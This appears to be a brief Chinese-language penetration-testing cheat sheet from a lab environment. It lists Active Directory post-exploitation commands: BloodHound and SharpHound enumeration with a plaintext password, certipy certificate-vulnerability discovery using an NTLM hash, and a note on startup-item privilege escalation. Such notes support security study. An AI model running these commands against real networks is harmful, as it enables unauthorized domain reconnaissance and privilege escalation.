

某一点攻击成功后, bloodhound

```sh
proxychains bloodhound-python -d xiaorang.lab -u yangdming -p kier@n10 -gc dc.xiaorang.lab -c all
## 或 SharpHound
SharpHound.exe --ldapusername yangdming --ldappassword kier@n10 -c all
```

配置一下hosts：

```sh
172.22.61.17 xiaorang.lab
172.22.61.17 dc.xiaorang.lab
```

### certipy 证书探测

```sh
proxychains certipy find -u win2012\$@xiaorang.lab -hashes 00000000000000000000000000000000:41a258d72365350640270508748c9675 -dc-ip 172.22.61.17 -vulnerable
cat 20231030050124_Certipy.txt
```

## 常见提权

* 启动项提权, addUser.bat
